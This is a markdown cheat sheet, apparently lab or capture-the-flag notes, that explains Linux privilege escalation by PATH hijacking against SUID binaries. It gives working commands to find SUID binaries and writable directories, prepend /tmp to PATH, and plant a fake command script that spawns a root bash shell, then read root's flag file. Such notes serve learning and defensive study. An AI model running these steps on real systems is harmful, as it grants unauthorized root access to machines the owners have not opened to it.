# Privilege Escalation: PATH Hijacking

## How It Works
If a SUID binary calls another program/command without an absolute path (e.g. calls `thm` instead of `/usr/bin/thm`),
the system looks for it in the directories listed in `$PATH` — in order.
By injecting a malicious script with the same name into a directory we control (like `/tmp`),
and prepending that directory to `$PATH`, we can trick the SUID binary into running our script as root.

---

## Step 1 — Find SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm /4000 2>/dev/null
```
Look for unusual binaries outside of `/usr/bin` or `/bin`, especially in home directories.

## Step 2 — Inspect the Binary
```bash
strings [binary]        # look for commands called without absolute path
ltrace [binary]         # trace library calls
strace [binary]         # trace system calls
```
If a binary calls something like `thm`, `service`, `curl` etc. without a full path — it's exploitable.

## Step 3 — Check Writable Directories
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
Look for writable directories you can drop a malicious file into (e.g. `/tmp`, `/home/[user]`).

## Step 4 — Check & Modify $PATH
```bash
# View current PATH
echo $PATH

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Verify
echo $PATH
```

## Step 5 — Create Malicious Script
```bash
# Navigate to your writable directory
cd /tmp

# Create a file with the same name as the command the SUID binary calls
echo "/bin/bash" > thm

# Make it executable
chmod 777 thm
```

## Step 6 — Execute the SUID Binary
```bash
cd /home/[user]
./[suid-binary]
```
If successful, you will get a root shell.

## Step 7 — Verify & Find Flags
```bash
whoami
id
find / -name flag*.txt 2>/dev/null
cat /root/root.txt
```

---

## Quick Reference
| Command | Purpose |
|---|---|
| `find / -type f -perm -04000 -ls 2>/dev/null` | Find all SUID binaries |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u` | Find writable directories |
| `echo $PATH` | View current PATH |
| `export PATH=/tmp:$PATH` | Prepend /tmp to PATH |
| `strings [binary]` | Find unqualified command calls in binary |
| `echo "/bin/bash" > [command] && chmod 777 [command]` | Create malicious script |

---

## Notes
- The called command must not use an absolute path (e.g. `thm` not `/usr/bin/thm`)
- Your injected directory must come **before** the real one in `$PATH`
- The SUID binary must be owned by root and have the SUID bit set
- `gcc` is not required — you only need to write a shell script, not compile C code
